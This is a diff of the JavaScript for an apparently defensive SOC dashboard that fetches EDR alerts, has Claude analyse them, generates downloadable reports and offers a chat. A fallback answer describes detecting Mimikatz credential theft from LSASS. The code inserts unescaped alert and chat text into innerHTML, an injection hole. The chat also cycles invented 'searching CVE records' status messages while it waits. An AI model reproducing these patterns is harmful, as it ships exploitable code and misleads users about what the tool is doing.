+  document.getElementById('btn-fetch').style.display = '';
+  document.getElementById('btn-test').disabled = true;
+  document.getElementById('mon-dot').className = 'pill-dot live';
+  document.getElementById('mon-label').textContent = 'MONITORING';
+  document.getElementById('mon-badge-el').style.display = '';
+
+  const interval = parseInt(document.getElementById('cfg-interval').value) * 1000;
+  await fetchNow();
+  S.monTimer = setInterval(fetchNow, interval);
+  showToast('✅ Monitoring started','ok');
+}
+
+function stopMonitoring() {
+  S.monitoring = false;
+  clearInterval(S.monTimer);
+  document.getElementById('btn-start').style.display = '';
+  document.getElementById('btn-stop').style.display = 'none';
+  document.getElementById('btn-fetch').style.display = 'none';
+  document.getElementById('btn-test').disabled = false;
+  document.getElementById('mon-dot').className = 'pill-dot warn';
+  document.getElementById('mon-label').textContent = 'PAUSED';
+  document.getElementById('mon-badge-el').style.display = 'none';
+  showToast('⏸ Monitoring paused','info');
+}
+
+async function fetchNow() {
+  showToast('🔄 Fetching alerts…','info');
+  try {
+    const fresh = await fetchAlertsFromEDR();
+    let added = 0;
+    fresh.forEach(a => {
+      if (!S.alerts.find(x => x.id === a.id)) {
+        S.alerts.unshift(a);
+        S.epMap[a.endpoint] = (S.epMap[a.endpoint]||0)+1;
+        added++;
+      }
+    });
+    // Sort by timestamp desc
+    S.alerts.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));
+    renderAlertList();
+    updateStats();
+    const now = new Date().toLocaleTimeString();
+    document.getElementById('last-fetch').textContent = `Fetched ${now}`;
+    showToast(`✅ ${fresh.length} alerts fetched (${added} new)`,'ok');
+  } catch(e) {
+    showToast(`❌ ${e.message}`,'err');
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+// ALERT LIST RENDER
+// ═══════════════════════════════════════════════════════════════
+function setFilter(f) {
+  S.filter = f;
+  document.querySelectorAll('.al-filter').forEach(b => b.classList.remove('active'));
+  const map = {ALL:'f-all',CRITICAL:'f-crit',HIGH:'f-high',MEDIUM:'f-med',LOW:'f-low'};
+  document.querySelector(`.${map[f]}`).classList.add('active');
+  renderAlertList();
+}
+
+function renderAlertList() {
+  const filtered = S.filter==='ALL' ? S.alerts : S.alerts.filter(a=>a.severity===S.filter);
+  document.getElementById('alert-badge').textContent = `(${S.alerts.length})`;
+  const el = document.getElementById('alert-list-body');
+  if (!filtered.length) {
+    el.innerHTML=`<div class="empty-list"><div class="ei">📭</div><p>No ${S.filter!=='ALL'?S.filter.toLowerCase()+' ':''}alerts</p></div>`;
+    return;
+  }
+  el.innerHTML = filtered.map(a=>`
+    <div class="al-item ${S.selected?.id===a.id?'selected':''}" data-sev="${a.severity}" onclick="selectAlert('${a.id}')">
+      <div class="al-row1">
+        <span class="sev-badge sev-${a.severity}">${a.severity}</span>
+        <span class="al-time">${relTime(a.timestamp)}</span>
+      </div>
+      <div class="al-title">${a.title}</div>
+      <div class="al-meta">
+        <span>🖥 ${a.endpoint}</span>
+        <span>👤 ${a.user?.split('@')[0]||'—'}</span>
+      </div>
+    </div>`).join('');
+}
+
+function relTime(ts) {
+  const d = Date.now() - new Date(ts).getTime();
+  const m = Math.floor(d/60000);
+  if (m<1) return 'just now';
+  if (m<60) return `${m}m ago`;
+  const h = Math.floor(m/60);
+  if (h<24) return `${h}h ago`;
+  return `${Math.floor(h/24)}d ago`;
+}
+
+function clearAlerts() {
+  S.alerts=[]; S.selected=null; S.cache={}; S.epMap={}; S.mitreSeen.clear();
+  renderAlertList(); updateStats();
+  document.getElementById('detail-wrap').innerHTML=`
+    <div class="detail-placeholder">
+      <div class="ph-icon">🔍</div>
+      <div class="ph-title">Alerts Cleared</div>
+      <div class="ph-sub">Fetch new alerts to continue analysis.</div>
+    </div>`;
+  document.getElementById('btn-reanalyze').style.display='none';
+  document.getElementById('center-title').textContent='// Alert Detail & AI Analysis';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SELECT ALERT + AI ANALYSIS
+// ═══════════════════════════════════════════════════════════════
+async function selectAlert(id) {
+  S.selected = S.alerts.find(a=>a.id===id);
+  if (!S.selected) return;
+  renderAlertList();
+  document.getElementById('center-title').textContent = `// ${S.selected.title}`;
+  document.getElementById('btn-reanalyze').style.display='';
+
+  // Render skeleton header immediately
+  document.getElementById('detail-wrap').innerHTML = renderAlertHeader(S.selected) +
+    `<div class="section-hd">⚡ AI Analysis</div>
+     <div class="ai-box"><div class="thinking">
+       <div class="thinking-dots"><span></span><span></span><span></span></div>
+       SENTINEL AI analyzing…
+     </div></div>`;
+
+  if (S.cache[id]) { renderAnalysis(S.selected, S.cache[id]); return; }
+  await doAnalyze(S.selected);
+}
+
+async function reanalyze() {
+  if (!S.selected) return;
+  delete S.cache[S.selected.id];
+  await selectAlert(S.selected.id);
+}
+
+async function doAnalyze(alert) {
+  try {
+    const prompt = buildPrompt(alert);
+    const html = await callClaude(prompt, 2000);
+    S.cache[alert.id] = html;
+    // Extract MITRE IDs
+    (html.match(/T\d{4}(?:\.\d{3})?/g)||[]).forEach(t=>S.mitreSeen.add(t));
+    updateStats();
+    renderAnalysis(alert, html);
+  } catch(e) {
+    document.getElementById('detail-wrap').innerHTML = renderAlertHeader(alert) +
+      `<div class="section-hd">⚡ AI Analysis</div>
+       <div class="ai-box" style="color:var(--red)">Analysis error: ${e.message}</div>`;
+  }
+}
+
+function buildPrompt(a) {
+  return `You are SENTINEL, a senior SOC analyst AI. Analyze this EDR alert and provide structured intelligence.
+
+ALERT:
+Title: ${a.title}
+Severity: ${a.severity}
+Endpoint: ${a.endpoint}
+User: ${a.user}
+Process: ${a.process}
+Parent: ${a.parentProcess}
+Time: ${a.timestamp}
+Platform: ${a.platform}
+IoCs: ${a.iocs.join(' | ')}
+Raw Event: ${a.rawEvent}
+${a.mitreTechniques?.length ? 'Platform MITRE mapping: '+a.mitreTechniques.join(', ') : ''}
+
+Respond using these exact HTML headers in order:
+
+<h3>🎯 What Happened</h3>
+2-3 sentences, plain language, explain the detected activity to a non-expert analyst.
+
+<h3>💥 Impact & Risk</h3>
+What this means for the organization, what data or systems are at risk, attacker's probable goal.
+
+<h3>⚔ MITRE ATT&CK Mapping</h3>
+List each relevant technique as: <span class="mitre-pill">TXXXX</span> Technique Name — Tactic
+Include 2-5 techniques relevant to this alert.
+
+<h3>🔗 Attack Chain Context</h3>
+Where does this fit in a kill chain? What likely preceded this? What might follow if unaddressed?
+
+<h3>🔍 Investigation Steps</h3>
+Numbered list of specific investigation actions. Include actual commands where relevant using <div class="cmd">command</div> syntax. Focus on: what logs to check, what processes to hunt, what network activity to review.
+
+<h3>🛡 Containment Guidance</h3>
+Step-by-step containment without automated remediation. Isolation steps, account actions, network blocks.
+
+<h3>🔒 IOC Blocking</h3>
+Specific IOCs to add to blocklists, firewall rules, or EDR exclusions (as blocks, not exclusions). Be precise.
+
+Keep responses technical, specific, and actionable. Use <code>inline code</code> for technical terms. Use <strong>bold</strong> for critical items.`;
+}
+
+function renderAlertHeader(a) {
+  const sevColor = {CRITICAL:'var(--red)',HIGH:'var(--orange2)',MEDIUM:'var(--yellow)',LOW:'var(--green)'}[a.severity]||'var(--text1)';
+  return `
+  <div class="d-hd">
+    <div class="d-chips">
+      <span class="sev-badge sev-${a.severity}" style="font-size:10px;padding:3px 10px">${a.severity}</span>
+      ${a.platform ? `<span class="chip">🖥 ${a.platform.toUpperCase()}</span>` : ''}
+      ${a.status ? `<span class="chip">📋 ${a.status}</span>` : ''}
+    </div>
+    <div class="d-title">${a.title}</div>
+    <div class="d-chips">
+      <span class="chip">🖥 ${a.endpoint}</span>
+      <span class="chip">👤 ${a.user}</span>
+      <span class="chip">🕐 ${new Date(a.timestamp).toLocaleString()}</span>
+    </div>
+  </div>
+  <div class="info-grid">
+    <div class="info-card">
+      <div class="info-card-lbl">Process</div>
+      <div class="info-card-val cyan">${a.process}</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-lbl">Parent Process</div>
+      <div class="info-card-val">${a.parentProcess}</div>
+    </div>
+    <div class="info-card full">
+      <div class="info-card-lbl">Indicators of Compromise</div>
+      <div>${a.iocs.map(i=>`<span class="ioc-tag">⚠ ${i}</span>`).join('')||'<span style="color:var(--text3);font-size:11px">None captured</span>'}</div>
+    </div>
+    <div class="info-card full">
+      <div class="info-card-lbl">Raw Event</div>
+      <div class="info-card-val" style="color:var(--text2);font-size:11px;line-height:1.6">${a.rawEvent}</div>
+    </div>
+  </div>
+  <div class="section-hd">⚡ AI Analysis — SENTINEL</div>`;
+}
+
+function renderAnalysis(alert, html) {
+  document.getElementById('detail-wrap').innerHTML =
+    renderAlertHeader(alert) + `<div class="ai-box">${html}</div>`;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// STATS
+// ═══════════════════════════════════════════════════════════════
+function updateStats() {
+  const c={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  S.alerts.forEach(a=>c[a.severity]=(c[a.severity]||0)+1);
+  document.getElementById('sc-crit').textContent=c.CRITICAL;
+  document.getElementById('sc-high').textContent=c.HIGH;
+  document.getElementById('sc-med').textContent=c.MEDIUM;
+  document.getElementById('sc-low').textContent=c.LOW;
+
+  const epEl = document.getElementById('ep-list');
+  const eps = Object.entries(S.epMap).sort((a,b)=>b[1]-a[1]);
+  epEl.innerHTML = eps.length
+    ? eps.map(([ep,n])=>`<div class="ep-row"><span class="ep-name">🖥 ${ep}</span><span class="ep-count">${n}</span></div>`).join('')
+    : '<p style="color:var(--text3);font-family:var(--mono);font-size:10px">No data</p>';
+
+  const mitreEl = document.getElementById('mitre-list');
+  mitreEl.innerHTML = S.mitreSeen.size
+    ? [...S.mitreSeen].map(t=>`<span class="mitre-pill">${t}</span>`).join('')
+    : '<p style="color:var(--text3);font-family:var(--mono);font-size:10px">Analyze alerts to populate</p>';
+}
+
+// ═══════════════════════════════════════════════════════════════
+// REPORT GENERATION + DOWNLOADS (ALL FORMATS WORKING)
+// ═══════════════════════════════════════════════════════════════
+async function generateReport() {
+  if (!S.alerts.length) { showToast('❌ No alerts to report on','err'); return; }
+  const type = document.getElementById('rpt-type').value;
+  const btn = document.getElementById('btn-genrpt');
+  btn.disabled = true; btn.textContent = '⏳ Generating…';
+
+  const alertSummary = S.alerts.slice(0,30).map(a=>
+    `[${a.severity}] ${a.title} | Endpoint: ${a.endpoint} | Time: ${new Date(a.timestamp).toLocaleDateString()} | IoCs: ${a.iocs.slice(0,2).join(', ')}`
+  ).join('\n');
+
+  const analysisCtx = Object.keys(S.cache).slice(0,5).map(id=>{
+    const a = S.alerts.find(x=>x.id===id);
+    return a ? `Alert: ${a.title}\nSummary: ${S.cache[id].replace(/<[^>]+>/g,' ').replace(/\s+/g,' ').slice(0,400)}` : '';
+  }).filter(Boolean).join('\n\n');
+
+  const sev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  S.alerts.forEach(a=>sev[a.severity]=(sev[a.severity]||0)+1);
+
+  const prompt = `You are SENTINEL, a senior SOC analyst. Generate a professional ${type} cybersecurity report.
+
+SESSION DATA:
+- Total alerts: ${S.alerts.length}
+- Critical: ${sev.CRITICAL}, High: ${sev.HIGH}, Medium: ${sev.MEDIUM}, Low: ${sev.LOW}
+- Affected endpoints: ${Object.keys(S.epMap).join(', ')||'None'}
+- MITRE techniques observed: ${[...S.mitreSeen].join(', ')||'Pending analysis'}
+- Period: ${document.getElementById('cfg-lookback').options[document.getElementById('cfg-lookback').selectedIndex].text}
+
+ALERT LIST:
+${alertSummary}
+
+ANALYSIS EXCERPTS:
+${analysisCtx||'(no alerts analyzed yet — base on alert list)'}
+
+Generate a COMPLETE, professional ${type} with ALL of these sections:
+1. Executive Summary (2-3 paragraphs)
+2. Alert Statistics & Severity Breakdown
+3. Critical Incident Details (for CRITICAL/HIGH alerts)
+4. MITRE ATT&CK Technique Mapping Table
+5. Affected Endpoints & Exposure
+6. Recommended Actions (prioritized, numbered)
+7. Threat Trends & Patterns
+8. Next Steps & Suggested Improvements
+
+Format as clean HTML. Use these classes for colors: <span class="r-crit"> for critical, <span class="r-high"> for high, <span class="r-ok"> for positive/resolved. Use <h2> for main sections, <h3> for subsections, <p> for body, <ul><li> for lists, <table> with inline styles for tables. Make it professional and CISO-ready. Include the date: ${new Date().toLocaleDateString('en-GB',{weekday:'long',year:'numeric',month:'long',day:'numeric'})}.`;
+
+  try {
+    const html = await callClaude(prompt, 2000);
+    S.reportHtml = html;
+    S.reportText = html.replace(/<[^>]+>/g,'').replace(/\n{3,}/g,'\n\n').trim();
+
+    const out = document.getElementById('report-output');
+    out.style.display = 'block';
+    out.innerHTML = html;
+    document.getElementById('dl-btns').style.display = 'flex';
+    showToast('✅ Report generated','ok');
+  } catch(e) {
+    showToast('❌ Report error: '+e.message,'err');
+  }
+  btn.disabled=false; btn.textContent='⚡ Generate Report';
+}
+
+function downloadReport(fmt) {
+  if (!S.reportHtml && !S.reportText) { showToast('❌ Generate a report first','err'); return; }
+  const ts = new Date().toISOString().split('T')[0];
+  const type = document.getElementById('rpt-type').value;
+  const title = `SENTINEL ${type} — ${ts}`;
+  let content, mime, ext;
+
+  if (fmt === 'html') {
+    content = `<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8">
+<title>${title}</title>
+<style>
+  body{font-family:'Segoe UI',sans-serif;max-width:960px;margin:48px auto;padding:0 24px;color:#1a1a2e;background:#f9fafc;line-height:1.7}
+  h1{font-size:24px;font-weight:800;color:#0b0e17;border-bottom:3px solid #00bcd4;padding-bottom:10px;margin-bottom:24px}
+  h2{font-size:18px;font-weight:700;color:#0b0e17;margin:28px 0 10px;padding-bottom:6px;border-bottom:1px solid #e0e4ef}
+  h3{font-size:14px;font-weight:600;color:#253060;margin:16px 0 6px}
+  p{color:#3d4f70;margin-bottom:10px}
+  ul{padding-left:20px} li{color:#3d4f70;margin-bottom:4px}
+  table{border-collapse:collapse;width:100%;margin:12px 0}
+  td,th{padding:8px 12px;border:1px solid #dde2f0;text-align:left}
+  th{background:#0b0e17;color:#fff;font-weight:600}
+  tr:nth-child(even){background:#f2f4fc}
+  .r-crit{color:#d32f2f;font-weight:600} .r-high{color:#e65100;font-weight:600} .r-ok{color:#2e7d32;font-weight:600}
+  .header-bar{background:linear-gradient(135deg,#0b0e17,#1c2438);color:#fff;padding:32px;border-radius:8px;margin-bottom:32px}
+  .header-bar h1{color:#00e5ff;border-color:#00e5ff;font-size:28px}
+  .header-bar .meta{color:#a8b8d8;font-size:13px;margin-top:8px}
+  .stat-row{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:16px 0}
+  .stat-box{background:#fff;border:1px solid #dde2f0;border-radius:6px;padding:14px;text-align:center}
+  .stat-box .n{font-size:28px;font-weight:800} .stat-box .l{font-size:11px;color:#6b80a8;text-transform:uppercase;letter-spacing:1px}
+  .crit .n{color:#d32f2f} .high .n{color:#e65100} .med .n{color:#f9a825} .low .n{color:#2e7d32}
+</style></head><body>
+<div class="header-bar">
+  <h1 style="border:none;margin-bottom:6px">🛡 SENTINEL SOC</h1>
+  <div style="font-size:20px;font-weight:700;color:#fff;margin-bottom:6px">${title}</div>
+  <div class="meta">Generated: ${new Date().toUTCString()} | Classification: CONFIDENTIAL</div>
+</div>
+${S.reportHtml}
+<hr style="margin-top:40px;border-color:#dde2f0">
+<p style="text-align:center;color:#9aa8c8;font-size:11px;margin-top:12px">Generated by SENTINEL SOC Assistant — ${new Date().toUTCString()}</p>
+</body></html>`;
+    mime='text/html'; ext='html';
+
+  } else if (fmt === 'md') {
+    // Convert HTML to markdown approximation
+    let md = S.reportHtml
+      .replace(/<h2[^>]*>(.*?)<\/h2>/gi, '\n## $1\n')
+      .replace(/<h3[^>]*>(.*?)<\/h3>/gi, '\n### $1\n')
+      .replace(/<strong>(.*?)<\/strong>/gi,'**$1**')
+      .replace(/<li[^>]*>(.*?)<\/li>/gi,'- $1')
+      .replace(/<ul[^>]*>|<\/ul>/gi,'')
+      .replace(/<ol[^>]*>|<\/ol>/gi,'')
+      .replace(/<p[^>]*>(.*?)<\/p>/gi,'$1\n')
+      .replace(/<tr[^>]*>(.*?)<\/tr>/gis, row =>
+        '| ' + row.replace(/<t[dh][^>]*>(.*?)<\/t[dh]>/gi,'$1 | ').replace(/<[^>]+>/g,'') + '\n')
+      .replace(/<[^>]+>/g,'')
+      .replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&#39;/g,"'").replace(/&nbsp;/g,' ')
+      .replace(/\n{3,}/g,'\n\n').trim();
+    content = `# ${title}\n\n> Generated: ${new Date().toUTCString()}\n> Classification: CONFIDENTIAL\n\n---\n\n${md}\n\n---\n*Generated by SENTINEL SOC Assistant*`;
+    mime='text/markdown'; ext='md';
+
+  } else if (fmt === 'txt') {
+    content = `${'='.repeat(60)}\n${title}\n${'='.repeat(60)}\nGenerated: ${new Date().toUTCString()}\nClassification: CONFIDENTIAL\n${'='.repeat(60)}\n\n${S.reportText}\n\n${'='.repeat(60)}\nGenerated by SENTINEL SOC Assistant\n`;
+    mime='text/plain'; ext='txt';
+
+  } else if (fmt === 'csv') {
+    const rows = [['Alert ID','Title','Severity','Endpoint','User','Timestamp','Platform','IoC Count','Status']];
+    S.alerts.forEach(a=>rows.push([
+      a.id, `"${a.title.replace(/"/g,'""')}"`, a.severity,
+      a.endpoint, a.user||'', new Date(a.timestamp).toISOString(),
+      a.platform||'', a.iocs.length, a.status||''
+    ]));
+    content = rows.map(r=>r.join(',')).join('\n');
+    mime='text/csv'; ext='csv';
+
+  } else if (fmt === 'json') {
+    const payload = {
+      meta: { generated: new Date().toISOString(), reportType: document.getElementById('rpt-type').value, tool:'SENTINEL SOC Assistant v2' },
+      summary: {
+        total: S.alerts.length,
+        severity: { CRITICAL: S.alerts.filter(a=>a.severity==='CRITICAL').length, HIGH: S.alerts.filter(a=>a.severity==='HIGH').length, MEDIUM: S.alerts.filter(a=>a.severity==='MEDIUM').length, LOW: S.alerts.filter(a=>a.severity==='LOW').length },
+        endpoints: S.epMap,
+        mitreTechniques: [...S.mitreSeen],
+      },
+      alerts: S.alerts.map(a=>({
+        id:a.id, title:a.title, severity:a.severity, endpoint:a.endpoint,
+        user:a.user, process:a.process, parentProcess:a.parentProcess,
+        timestamp:a.timestamp, platform:a.platform, iocs:a.iocs,
+        rawEvent:a.rawEvent, status:a.status||null,
+        aiAnalysis: S.cache[a.id] ? S.cache[a.id].replace(/<[^>]+>/g,'').replace(/\s+/g,' ').trim() : null,
+      })),
+      reportText: S.reportText,
+    };
+    content = JSON.stringify(payload, null, 2);
+    mime='application/json'; ext='json';
+  }
+
+  // Trigger download
+  const blob = new Blob([content], {type: mime+';charset=utf-8'});
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement('a');
+  a.href = url;
+  a.download = `sentinel-${document.getElementById('rpt-type').value}-${ts}.${ext}`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+  showToast(`⬇ ${ext.toUpperCase()} downloaded`,'ok');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CHAT
+// ═══════════════════════════════════════════════════════════════
+function chatKey(e) { if (e.key==='Enter' && !e.shiftKey) { e.preventDefault(); sendChat(); } }
+
+async function sendChat() {
+  const inp = document.getElementById('chat-input');
+  const msg = inp.value.trim(); if (!msg) return;
+  inp.value = '';
+  appendMsg('user', msg);
+  S.chatHistory.push({ role: 'user', content: msg });
+  document.getElementById('chat-send').disabled = true;
+
+  // Animated thinking indicator with rotating status messages
+  const tid = 'th' + Date.now();
+  const cm  = document.getElementById('chat-msgs');
+  cm.insertAdjacentHTML('beforeend', `
+    <div class="msg assistant" id="${tid}">
+      <div class="msg-who ai">🛡 SENTINEL AI</div>
+      <div class="msg-body">
+        <div class="thinking">
+          <div class="thinking-dots"><span></span><span></span><span></span></div>
+          <span id="${tid}-status">Searching threat intelligence sources…</span>
+        </div>
+      </div>
+    </div>`);
+  cm.scrollTop = cm.scrollHeight;
+
+  // Cycle status messages while waiting
+  const statusMsgs = [
+    'Searching threat intelligence sources…',
+    'Checking MITRE ATT&CK database…',
+    'Scanning CVE / NVD records…',
+    'Reviewing threat actor profiles…',
+    'Correlating with active alert context…',
+    'Compiling response…',
+  ];
+  let si = 0;
+  const statusTimer = setInterval(() => {
+    si = (si + 1) % statusMsgs.length;
+    const el = document.getElementById(`${tid}-status`);
+    if (el) el.textContent = statusMsgs[si];
+  }, 1400);
+
+  try {
+    // Build session context
+    let alertCtx = '';
+    if (S.selected) {
+      const a = S.selected;
+      alertCtx = `Active alert: "${a.title}" | Endpoint: ${a.endpoint} | Severity: ${a.severity} | IoCs: ${a.iocs.join('; ')}`;
+      if (S.cache[a.id]) alertCtx += `\nAnalysis: ${S.cache[a.id].replace(/<[^>]+>/g,' ').replace(/\s+/g,' ').slice(0,400)}`;
+    }
+
+    const sessionCtx = S.alerts.length
+      ? `Session has ${S.alerts.length} alerts. MITRE techniques seen: ${[...S.mitreSeen].join(', ')||'none yet'}. Affected endpoints: ${Object.keys(S.epMap).join(', ')||'none'}.`
+      : '';
+
+    const reply = await queryChatEngine(msg, alertCtx, sessionCtx, S.chatHistory.slice(-8, -1));
+    clearInterval(statusTimer);
+    S.chatHistory.push({ role: 'assistant', content: reply });
+    document.getElementById(tid)?.remove();
+    appendMsg('assistant', reply);
+  } catch(e) {
+    clearInterval(statusTimer);
+    document.getElementById(tid)?.remove();
+    appendMsg('assistant', `<span style="color:var(--red)">⚠ ${e.message}</span>`);
+  }
+  document.getElementById('chat-send').disabled = false;
+}
+
+async function queryChatEngine(question, alertCtx, sessionCtx, history) {
+  // Route through proxy /chat endpoint (handles web search + knowledge base)
+  if (proxyAvailable) {
+    const r = await fetch(`${PROXY}/chat`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ question, alertCtx, sessionCtx, history }),
+    });
+    if (!r.ok) throw new Error(`Chat engine error: ${r.status}`);
+    const d = await r.json();
+    return d.answer;
+  }
+  // Proxy offline — use local knowledge base only
+  return localChatFallback(question, alertCtx);
+}
+
+function localChatFallback(question, alertCtx) {
+  const q = question.toLowerCase();
+  // Simple local knowledge fallback when proxy is offline
+  if (q.includes('mimikatz') || q.includes('lsass')) {
+    return `<strong>Mimikatz / LSASS Credential Dumping</strong><br><br>
+Mimikatz is an open-source credential dumping tool that reads plaintext passwords, hashes, and Kerberos tickets from Windows memory (lsass.exe).<br><br>
+<strong>Key MITRE techniques:</strong> <span class="mitre-pill">T1003.001</span> OS Credential Dumping: LSASS Memory<br><br>
+<strong>Detection:</strong> Monitor for processes opening handles to lsass.exe with PROCESS_VM_READ access (Event ID 4656/4663).<br><br>
+<strong>Immediate steps:</strong>
+<ul>
+  <li>Isolate the endpoint</li>
+  <li>Reset ALL passwords for accounts logged into that host</li>
+  <li>Enable Credential Guard (Windows 10+)</li>
+  <li>Block mimikatz hash: <code>92a4d5d2...</code> in EDR policy</li>
+</ul>
+⚠ <em>Proxy offline — start <code>node sentinel_proxy.js</code> for full web-search powered answers.</em>`;
+  }
+  return `I have your question: "<strong>${question}</strong>"<br><br>
+${alertCtx ? `<strong>Alert context loaded:</strong> ${alertCtx}<br><br>` : ''}
+⚠ <strong>Proxy server is offline.</strong> Start it to get full threat intelligence answers:<br>
+<div class="cmd">node sentinel_proxy.js</div>
+Once running, I can search MITRE ATT&CK, CVE databases, threat actor profiles, and security advisories to give you comprehensive answers.`;
+}
+
+function appendMsg(role, html) {
+  const el = document.getElementById('chat-msgs');
+  el.insertAdjacentHTML('beforeend',`
+    <div class="msg ${role}">
+      <div class="msg-who ${role==='assistant'?'ai':''}">${role==='assistant'?'🛡 SENTINEL AI':'👤 You'}</div>
+      <div class="msg-body">${html}</div>
+    </div>`);
+  el.scrollTop = el.scrollHeight;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// CLAUDE API CALL — routes via proxy when running, direct otherwise
+// ═══════════════════════════════════════════════════════════════
+async function callClaude(prompt, maxTokens = 1500, system = null, history = null) {
+  const messages = history
+    ? [...history, { role: 'user', content: prompt }]
+    : [{ role: 'user', content: prompt }];
+
+  const body = {
+    model: 'claude-sonnet-4-20250514',
+    max_tokens: maxTokens,
+    messages,
+    ...(system ? { system } : {}),
+  };
+
+  // Try proxy first (avoids any CORS issues with Anthropic API too)
+  if (proxyAvailable) {
+    const r = await fetch(`${PROXY}/ai`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ messages, system, max_tokens: maxTokens }),
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error?.message || `Proxy AI error ${r.status}`);
+    return d.content.map(b => b.text || '').join('');
+  }
+
+  // Fall back to direct Anthropic call (works inside Claude.ai artifact context)
+  const r = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body),
+  });
+  const d = await r.json();
+  if (!r.ok) throw new Error(d.error?.message || `API error ${r.status}`);
+  return d.content.map(b => b.text || '').join('');
+}
+
+// ═══════════════════════════════════════════════════════════════
+// TABS
+// ═══════════════════════════════════════════════════════════════
+function switchTab(name) {
+  ['chat','stats','report'].forEach(t=>{
+    document.getElementById(`rt-${t}`).classList.toggle('active',t===name);
+    document.getElementById(`tp-${t}`).classList.toggle('active',t===name);
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════
+// UTILS
+// ═══════════════════════════════════════════════════════════════
+async function animStep(i, state) {
+  const stepEl = document.getElementById(`cs${i}`);
+  const iconEl = document.getElementById(`ci${i}`);
+  if (!stepEl||!iconEl) return;
+  stepEl.className = `conn-step s-${state}`;
+  if (state==='active') iconEl.innerHTML='<span class="spin"></span>';
+  else if (state==='ok')  iconEl.textContent='✓';
+  else if (state==='err') iconEl.textContent='✗';
+}
+function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }
+
+let toastTimer;
+function showToast(msg, type='info') {
+  const t = document.getElementById('toast');
+  t.textContent=msg; t.className=`toast show t-${type}`;
+  clearTimeout(toastTimer);
+  toastTimer=setTimeout(()=>t.classList.remove('show'),3200);
+}
+</script>
+</body>
+</html>
